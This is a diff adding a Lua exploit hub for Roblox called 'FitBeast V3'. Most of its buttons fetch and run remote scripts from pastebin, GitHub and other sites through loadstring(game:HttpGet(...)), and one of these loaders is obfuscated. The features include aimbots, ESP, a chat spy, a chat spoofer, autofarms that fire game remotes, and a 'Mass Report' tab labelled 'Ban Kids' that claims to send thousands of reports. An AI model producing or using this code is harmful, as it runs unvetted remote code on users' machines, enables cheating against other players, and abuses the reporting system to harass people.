@@ -1,0 +1,387 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("FitBeast V3", "BloodTheme")
+
+local Tab = Window:NewTab("Home")
+local Section = Tab:NewSection("Welcome To FitBeast")
+local Section = Tab:NewSection("FitBeast Is A Custom Hub")
+local Section = Tab:NewSection("Filled With Leaked And Custom Script")
+local Section = Tab:NewSection("Discord F1#5315")
+local Section = Tab:NewSection("Scripted And Made By Fool")
+Section:NewKeybind("Keybind To Open And Close", "Change Gui Keybind To Anything", Enum.KeyCode.E, function()
+	Library:ToggleUI()
+end)
+
+local Tab = Window:NewTab("Player")
+local Section = Tab:NewSection("Local Player")
+
+Section:NewSlider("Walkspeed", "Walk Fast", 500, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+
+Section:NewButton("Anti Afk", "Don't Get Idle Kicked", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/wq41zvSL'))()
+end)
+
+Section:NewButton("Chat Spy", "See Private Chat", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/G5kqG4U1"))()
+end)
+
+Section:NewButton("Chat Spoofer", "Chat With Other Username", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/djBfk8Li", true))()
+end)
+
+local Main = Window:NewTab("Animation")
+local Section = Main:NewSection("Animation Changer")
+
+Section:NewToggle("Sneaky", "Animation Change", function(state)
+    if state then
+     local Animate = game.Players.LocalPlayer.Character.Animate
+Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
+Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
+Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
+Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
+Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
+Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
+Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
+game.Players.LocalPlayer.Character.Humanoid.Jump = true   
+    else
+    local Animate = game.Players.LocalPlayer.Character.Animate
+Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end
+end)
+
+Section:NewToggle("Ghost", "Animation Change", function(state)
+    if state then
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
+        Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
+        Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    else
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end
+end)
+
+Section:NewToggle("Toy", "Animation Change", function(state)
+    if state then
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    else
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end
+end)
+
+Section:NewToggle("Werewolf", "Animation Change", function(state)
+    if state then
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    else
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end
+end)
+
+Section:NewToggle("Zombie", "Animation Change", function(state)
+    if state then
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    else
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end
+end)
+
+Section:NewToggle("Ninja", "Animation Change", function(state)
+    if state then
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    else
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end
+end)
+
+Section:NewToggle("SuperHero", "Animation Change", function(state)
+    if state then
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    else
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
+        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    end
+end)
+
+local Tab = Window:NewTab("Breaking Point")
+local Section = Tab:NewSection("BP Script")
+
+Section:NewToggle("AutoFarm Credits", "30k-90k Within Within 10 Min", function(state)
+    if state then
+        _G.on = true
+        loadstring(game:HttpGet('https://pastebin.com/raw/01jNR0Jt'))()
+    else
+        _G.on = false
+        loadstring(game:HttpGet('https://pastebin.com/raw/01jNR0Jt'))()
+    end
+end)
+
+Section:NewToggle("AutoBuy Murder", "Buy Murder Every 45 Sec", function(state)
+    if state then
+        _G.on = true
+        while _G.on and wait(45) do
+            local args = {
+            [1] = 60,
+            [2] = {
+                ["confirm"] = true,
+                ["image"] = 0,
+                ["name"] = "\nBe the murderer \n [Who did it]",
+                ["price"] = 500,
+                ["data"] = "requestmurderer"
+            }
+        }
+        
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+        end
+    else
+        _G.on = false
+        while _G.on and wait(45) do
+            local args = {
+            [1] = 60,
+            [2] = {
+                ["confirm"] = true,
+                ["image"] = 0,
+                ["name"] = "\nBe the murderer \n [Who did it]",
+                ["price"] = 500,
+                ["data"] = "requestmurderer"
+            }
+        }
+        
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
+        end
+    end
+end)
+
+Section:NewToggle("AutoBuy Knife", "Buy Legandary Knife", function(state)
+    if state then
+        _G.on = true
+while _G.on and wait() do
+local args = {
+    [1] = 66,
+    [2] = "Knife Skins",
+    [3] = "Legendary Case"
+}
+
+game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+end
+    else
+        _G.on = false
+while _G.on and wait() do
+local args = {
+    [1] = 66,
+    [2] = "Knife Skins",
+    [3] = "Legendary Case"
+}
+
+game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+end
+    end
+end)
+
+Section:NewToggle("AutoBuy Gun", "Buy Legandary Gun", function(state)
+    if state then
+        _G.on = true
+        while _G.on and wait() do
+            local args = {
+            [1] = 66,
+            [2] = "Gun Skins",
+            [3] = "Legendary Case"
+        }
+        
+        game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+        end
+    else
+        _G.on = false
+        while _G.on and wait() do
+            local args = {
+            [1] = 66,
+            [2] = "Gun Skins",
+            [3] = "Legendary Case"
+        }
+        
+        game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(unpack(args))
+        end
+    end
+end)
+
+Section:NewButton("Silent Hit", "AimBot Gui", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/fFmJFepC"))()
+end)
+
+local Tab = Window:NewTab("Midnight Racing")
+local Section = Tab:NewSection("Midnight Racing Tokyo")
+
+Section:NewButton("Cars Speed Tune", "Make Your Car Go Fast", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GodXNation/GodXNation/main/midnight%20racing%20hubV2%20fixed", true))()
+end)
+
+Section:NewButton("AutoFarm Money", "Farm Money And Level", function()
+    loadstring(game:HttpGet(("https://darkhub.xyz/remote-script.lua"), true))()
+end)
+
+Section:NewButton("ESP", "Show Where Players Are", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/31kFool/ESP/main/ESP'))()
+end)
+
+local Tab = Window:NewTab("Da Hood")
+local Section = Tab:NewSection("Da Hood Script")
+
+Section:NewButton("Pro Aim", "AimLock", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/racemodex/my-scripts/master/dahoodaimlock", true))()
+end)
+
+Section:NewButton("AutoFarm", "Farm Cash", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/racemodex/my-scripts/master/dahoodautofarm", true))()
+end)
+
+Section:NewButton("Faded", "Da Hood Gui", function()
+    _G.Toggles = "V" -- You can put any keybind
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+end)
+
+local Tab = Window:NewTab("Admin")
+local Section = Tab:NewSection("Any Game Script")
+
+Section:NewButton("Infinite Yield", "Cmds Gui", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+Section:NewButton("Reviz Admin", "Cmds Gui", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RqaZUrBZ"))()
+end)
+
+Section:NewButton("ESP", "Show Players", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/31kFool/ESP/main/ESP'))()
+end)
+
+local Tab = Window:NewTab("Hubs")
+local Section = Tab:NewSection("Hubs With Gui And Script")
+
+Section:NewButton("Dark Hub", "FPS Games Script", function()
+    loadstring(game:HttpGet(("https://darkhub.xyz/remote-script.lua"), true))()
+end)
+
+Section:NewButton("Eclipse Hub", "MM2 And Many Other Games", function()
+    getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+end)
+
+Section:NewButton("Owl Hub", "Aimbot And Esp", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
+end)
+
+local Tab = Window:NewTab("Mass Report")
+local Section = Tab:NewSection("Ban Kids")
+local Section = Tab:NewSection("!reportcount or !rc")
+local Section = Tab:NewSection("!massreport or !mass")
+
+Section:NewButton("Mass Report", "Send 10k-30k Reports", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/31kFool/mass/main/MassRe'))()
+end)
+
+local Tab = Window:NewTab("JailBird")
+local Section = Tab:NewSection("JB Script")
+
+Section:NewButton("JailBird Gui", "Aimbot And Esp", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/1iseo/rbx/main/jailbird/jailbird.lua"))()
+end)
